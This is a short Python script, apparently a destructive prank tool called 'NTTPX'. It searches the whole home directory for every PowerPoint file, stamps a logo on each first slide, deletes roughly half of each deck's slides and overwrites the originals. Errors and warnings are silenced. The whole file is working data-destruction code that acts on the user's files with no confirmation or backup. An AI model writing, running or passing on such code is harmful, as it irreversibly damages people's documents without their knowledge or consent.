import pptx
import pathlib
import warnings

def main():
    print("NTTPX: Searching for pptx slides...")

    try:
        for path in pathlib.Path.home().glob("**/*.pptx"):
            edit_pptx(str(path))
    except Exception:
        pass

    print("NTTPX: Halved all pptx slides!!")

def edit_pptx(path):
    try:
        prs = pptx.Presentation(path)

        top_slide = prs.slides[0]
        logo = top_slide.shapes.add_picture("nttpx_logo.png", 0, 0)
        logo.rotation = 340
        logo.top = int((prs.slide_height - logo.height) * 0.75)
        logo.left = int((prs.slide_width - logo.width) * 0.95)
        
        for i in range(1, int(len(prs.slides) / 2)):
            xml_slides = prs.slides._sldIdLst
            slides = list(xml_slides)
            xml_slides.remove(slides[i])

        prs.save(path)

    except Exception:
        pass

    print("NTTPX: " + path + " is halved")

if __name__ == "__main__":
    warnings.simplefilter("ignore")
    main()